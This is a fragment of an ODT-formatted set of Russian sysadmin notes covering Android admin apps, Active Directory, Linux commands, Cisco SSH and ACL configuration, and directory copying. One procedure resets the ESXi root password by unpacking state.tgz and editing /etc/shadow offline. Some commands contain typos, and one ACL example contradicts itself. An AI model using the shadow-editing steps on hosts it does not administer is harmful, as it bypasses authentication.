      <text:p text:style-name="P7">5. SELinux: руководство для начинающих (https://dev.to/jmau111/selinux-beginners-guide-15af)</text:p>
      <text:p text:style-name="P1">Полезный софт под Android:</text:p>
      <text:p text:style-name="P1">Termius (ex. ServerAuditor) - Быстрая, функциональная, удобная программка для доступа к серверу по SSH. https://www.termius.com/ https://4pda.to/forum/index.php?showtopic=419987</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Remote Desktop - Используйте Удаленный рабочий стол (Майкрософт) для Android для подключения к Виртуальному рабочему столу Azure, Windows 365, виртуальным приложениям и рабочим столам, предоставленным администратором, или к удаленным компьютерам. С помощью Удаленного рабочего стола (Майкрософт) вы можете работать продуктивно, где бы вы ни находились https://play.google.com/store/apps/details?id=com.microsoft.rdc.androidx&amp;hl=ru&amp;gl=US&amp;pli=1</text:span></text:p>
      <text:p text:style-name="P1">VNC Viewer Remote Desktop - VNC Viewer превращает ваш телефон в удаленный рабочий стол, предоставляя вам мгновенный доступ к вашим компьютерам Mac, Windows и Linux из любой точки мира https://play.google.com/store/apps/details?id=com.realvnc.viewer.android&amp;hl=ru&amp;gl=US https://4pda.to/forum/index.php?showtopic=119414</text:p>
      <text:p text:style-name="P1">Proxmox Virtual Environment - Войдите на свой сервер Proxmox Virtual Environment (VE) и управляйте виртуальными машинами, контейнерами, хостами и кластерами https://play.google.com/store/apps/details?id=com.proxmox.app.pve_flutter_frontend&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P1">MikroTik Pro - Используйте приложение для смартфона MikroTik, чтобы настроить маршрутизатор, когда компьютер недоступен https://play.google.com/store/apps/details?id=com.mikrotik.android.tikapp&amp;hl=ru&amp;gl=US https://4pda.to/forum/index.php?showtopic=999729</text:p>
      <text:p text:style-name="P1">Moobix 2.0 - Moobix идеально подходит для вас, используя систему мониторинга Zabbix, вы будете иметь ключевые функции инструмента в любое время и в любом месте. https://play.google.com/store/apps/details?id=cloud.zabbixinbox.moobixapp</text:p>
      <text:p text:style-name="P1">Tabbix - Важно: Вы должны написать полный URL-адрес zabbix при добавлении нового сервера. Если ваш zabbix работает на http: // yourzabbixurl / zabbix, вам нужно записать http: // yourzabbixurl / zabbix на новое текстовое поле сервера https://play.google.com/store/apps/details?id=com.tirgil.tabbix&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P1">OpenVPN Connect - Официальное приложение для Access Server, OpenVPN Cloud и сервисов, совместимых с OpenVPN https://4pda.to/forum/index.php?showtopic=727790 https://play.google.com/store/apps/details?id=net.openvpn.openvpn&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P1">Total Commander - Двухпанельный файловый менеджер для Android с русским интерфейсом https://4pda.to/forum/index.php?showtopic=224555 https://play.google.com/store/apps/details?id=com.ghisler.android.TotalCommander&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P17">Linux Command Library - В настоящее время приложение содержит 4608 справочных страниц, 21 основные категории и множество общих советов по работе с терминалом. Он работает на 100% в автономном режиме, не требует подключения к Интернету и не имеет программного обеспечения для отслеживания https://play.google.com/store/apps/details?id=com.inspiredandroid.linuxcommandbibliotheca&amp;hl=ru&amp;gl=US https://f-droid.org/ru/packages/com.inspiredandroid.linuxcommandbibliotheca/</text:p>
      <text:p text:style-name="P7">WiFi network Analyzer - Это приложение отслеживает и анализирует Вашу сеть и предупреждает если есть проблемы https://4pda.to/forum/index.php?showtopic=662401</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Срок действия учетной записи: Узнать срок действия учетной записи в ActiveDirectory можно через оснастку: Пользователи и компьютеры или с помощью команды Powershell. Во втором случае мы получим список всех учетных записей, у которых заканчивается срок действия. </text:span><text:span text:style-name="T2">Search-ADAccount -AccountExpiring -UsersOnly -TimeSpan 07.00:00:00 | Sort-Object -Descending AccountExpirationDate | ft Name, AccountExpirationDate. </text:span><text:span text:style-name="T3">Устанавливаем TimeSpan на одну неделю и получаем список учетных записей срок действия которых закончится в течение одной недели (7 дней).</text:span></text:p>
      <text:p text:style-name="P1">Команды Linux:</text:p>
      <text:p text:style-name="P1">ulimit - команда для вывода информации о лимитах ресурсов текущего пользователя;</text:p>
      <text:p text:style-name="P1">umount - команда для отключения файловой системы заданного устройства;</text:p>
      <text:p text:style-name="P1">uname - команда для вывода информации о версии ядра операционной системы;</text:p>
      <text:p text:style-name="P1">uniq - команда для удаления повторяющихся строк из текстового файла;</text:p>
      <text:p text:style-name="P1">unlink - команда для удаления ссылки на элемент файловой системы;</text:p>
      <text:p text:style-name="P1">unzip - команда для распаковки архива формата ZIP;</text:p>
      <text:p text:style-name="P1">uptime - команда для вывода информации о времени, в течение которого ваш компьютер функционирует;</text:p>
      <text:p text:style-name="P1">useradd - команда для создания новой учетной записи пользователя;</text:p>
      <text:p text:style-name="P1">userdel - команда для удаления учетной записи пользователя;</text:p>
      <text:p text:style-name="P7">usermod - команда для изменения параметров учетной записи пользователя</text:p>
      <text:p text:style-name="P1">Как быстро сбросить пароль от Root в ESXI ? / ESXI / root password /</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># sudo su</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># fdisk - l | grep /dev/sda</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mkdir /mnt/sda5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mkdir /temp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mount /dev/sda5 /mnt/sda5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># ls -l /mnt/sda5/state.tgz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -xf /mnt/sda5/state.tgz - C /temp/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># tar -xf /temp/local.tgz - C /temp/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># rm /temp/*.tgz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># nano /temp/etc/shadow</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># nano /temp/etc/shadow</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># cd /temp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -czf local.tgz etc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -czf state.tgz local.tgz</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># mv state.tgz /mnt/sda5/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># umount /mnt/sda5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"># reboot</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Cisco. </text:span><text:span text:style-name="T3">Базовая настройка:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Заливаем последнюю прошивку(для </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> необходим минимум </text:span><text:span text:style-name="T2">Advanced</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Security</text:span><text:span text:style-name="T3">), избавляемся от преднастроенного мусора и перегружаемся - </text:span><text:span text:style-name="T2">erase</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">startup</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">config</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Включаем шифрование паролей - </text:span><text:span text:style-name="T2">service</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">encryption</text:span></text:p>
      <text:p text:style-name="P1">Используем новую модель ААА и локальную базу пользователей - </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">aaa new-model</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">aaa authentication login default local</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Заводим пользователя с максимальными правами - </text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">privilege</text:span><text:span text:style-name="T3"> 15 </text:span><text:span text:style-name="T2">secret</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">password</text:span></text:p>
      <text:p text:style-name="P1">Назначаем имя роутеру - </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">hostname</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">R</text:span><text:span text:style-name="T3">1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">R</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">domain</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Генерируем ключ для </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">crypto</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">key</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">generate</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">rsa</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Настраиваем SSH - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip ssh authentication-retries 5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip ssh version 2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip ssh time-out 60</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Разрешаем </text:span><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3"> на удаленной консоли и делаем доступ сразу в привилегированный режим 15го уровня </text:span><text:span text:style-name="T2">line</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vty</text:span><text:span text:style-name="T3"> 0 4 - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">transport input telnet ssh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">privilege level 15</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключаем доступ по </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3"> - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">no ip http server</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">no ip http secure-server</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Настройка временной зоны и </text:span><text:span text:style-name="T2">ntp</text:span><text:span text:style-name="T3"> - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">clock timezone MSK 3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ntp server 146.0.32.144</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Настраиваем DNS - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip domain name domain</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip name-server 8.8.8.8</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Блокируем доступ при определённом количестве неправильных попыток - login block-for 600 attempts 5 within 30</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Отключаем ошибку резолва при неправильном наборе чего-либо в консоли - </text:span><text:span text:style-name="T2">no</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">lookup</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Задаём </text:span><text:span text:style-name="T2">timeout</text:span><text:span text:style-name="T3"> неактивности </text:span><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T3"> сессии - </text:span><text:span text:style-name="T2">exec</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">timeout</text:span><text:span text:style-name="T3"> 15 0</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Cisco</text:span><text:span text:style-name="T3"> (защищаем доступ):</text:span></text:p>
      <text:p text:style-name="P1">Установим пароль на доступ через консольный порт -</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">line</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">console</text:span><text:span text:style-name="T3"> 0</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">password</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Создаём </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> с разрешёнными для доступа сетями или хостами (пишем сети с обратной маской)</text:span></text:p>
      <text:p text:style-name="P15">access-list 1 permit 192.168.1.0 0.0.0.255 </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-list 1 permit 192.168.2.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключаем доступ по виртуальному терминалу для протокола </text:span><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T3"> и применяем ранее созданный </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> для ограничения доступа по </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3"> -</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">line vty 0 4 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">transport input ssh </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-class 1 in </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">privilege level 15 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login local </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Добавляем watch for login Attacks - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login block-for 600 attempts 2 within 30 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login delay 5 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">login quiet-mode access-class 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Cisco. ACL:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Стандартные ACL - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-list 100 permit host 172.16.6.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-list 100 deny host 172.16.6.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Расширенные ACL - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip access-list extended TEST</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>permit tcp host 172.16.6.66 host 172.16.0. eq ftp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>permit tcp host 172.16.6.66 gt 1023 any eq www</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Правила проверяются сверху вниз. как только проверка доходит до правила под которое пакет подпадает, проверка прекращается, независимо от того какие правила идут дальше. в конце задаётся неявное правило</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">deny</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">any</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">any</text:span></text:p>
      <text:p text:style-name="P1">т.е. если явно что-то не разрешить сверху, то это будет запрещено</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вешаем </text:span><text:span text:style-name="T2">ACL</text:span><text:span text:style-name="T3"> на интерфейс (</text:span><text:span text:style-name="T2">in</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">out</text:span><text:span text:style-name="T3">) - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">TEST</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">out</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Иногда необходимо удалить конкретную запись в </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> (для примера </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> 94.123.2.139). Для этого, сначала смотрим порядковые номера записей - </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">show</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">lists</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Standard</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> 1</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/></text:span><text:span text:style-name="T2">10 permit 185.40.30.134</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"><text:s/>20 permit 94.141.60.123</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>30 permit 94.123.2.139</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>90 permit 88.196.234.16</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>50 permit 222.251.243.67</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>40 permit 143.35.7.238</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Затем удаляем нужную - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># conf t</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(config)# ip access-list s 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(config-ext-nacl)# no 30</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">В данном случае S - Standard Access List</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Если вдруг понадобилось вставить запись в конкретное место, делаем так:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># conf t</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">(config)# ip access-list s 1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(config-ext-nacl)# 40 permit 94.123.2.139</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">OBJECT-GROUP</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Предположим, надо составить </text:span><text:span text:style-name="T2">ACL</text:span><text:span text:style-name="T3">, выпускающий три определенных адреса в интернет по трем одинаковым портам </text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> перспективой расширения количества адресов и портов. </text:span><text:span text:style-name="T2">Создаём список разрешённых портов - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">object-group service INET-PORTS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">description Ports allowed for some hosts</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcp eq www</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcp eq 8080</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">eq</text:span><text:span text:style-name="T3"> 443</text:span></text:p>
      <text:p text:style-name="P1">Создаём список разрешённых ипишек - </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">object-group network HOSTS-TO-INET</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">description Hosts allowed to browse the net</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">host 172.16.0.2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">host 172.16.0.3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">host 172.16.0.4</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Создаём ACL - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip access-list extended INET-OUT</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">permit object-group INET-PORTS object-group HOSTS-TO-INET any</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">И в завершении вешаем </text:span><text:span text:style-name="T2">ACL</text:span><text:span text:style-name="T3"> на интерфейс - </text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">TEST</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">out</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как скопировать структуру директорий в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1">Сначала необходимо перейти в директорию, где находятся нужная структура</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1</text:span></text:p>
      <text:p text:style-name="P1">Затем выполняем команду, которая находит директории и сохраняет пути к ни в файл</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> . -</text:span><text:span text:style-name="T2">type</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> &gt; </text:span><text:span text:style-name="T2">dirs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span></text:p>
      <text:p text:style-name="P1">Теперь необходимо перенести этот файл в директорию, где мы хотим воссоздать структуру</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mv</text:span><text:span text:style-name="T3"> ./</text:span><text:span text:style-name="T2">dirs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">2</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Переходим туда</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">И используя </text:span><text:span text:style-name="T2">xargs</text:span><text:span text:style-name="T3"> читаем из файла пути и создаем по ним структуру директорий</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">xargs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> &lt; </text:span><text:span text:style-name="T2">dirs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как увеличить размер каталога /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3">/:</text:span></text:p>
      <text:p text:style-name="P1">Иногда необходимо увеличить размер каталога, который в свою очередь находится в корневом каталоге системы.</text:p>
